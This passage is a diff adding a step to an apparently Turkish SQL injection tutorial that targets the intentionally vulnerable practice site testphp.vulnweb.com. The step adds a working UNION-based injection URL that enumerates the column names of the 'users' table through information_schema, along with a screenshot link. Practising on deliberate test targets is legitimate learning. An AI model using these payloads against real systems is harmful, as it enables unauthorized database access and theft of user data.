@@ -276,3 +276,11 @@ http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,
 ```
 
 ![image](https://github.com/user-attachments/assets/1f81aa73-dfb7-414b-b6d2-b76635f56e42)
+
+'users' tablosundan veri çekiyorum.
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,column_name,8,9,10,11%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27
+```
+
+![image](https://github.com/user-attachments/assets/ddeba672-4d73-409d-8175-2867d13e108f)
